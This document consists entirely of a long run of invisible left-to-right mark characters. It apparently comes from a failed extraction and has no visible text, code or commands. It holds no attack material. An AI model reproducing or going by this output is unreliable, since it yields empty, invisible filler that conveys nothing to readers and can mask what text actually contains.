‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎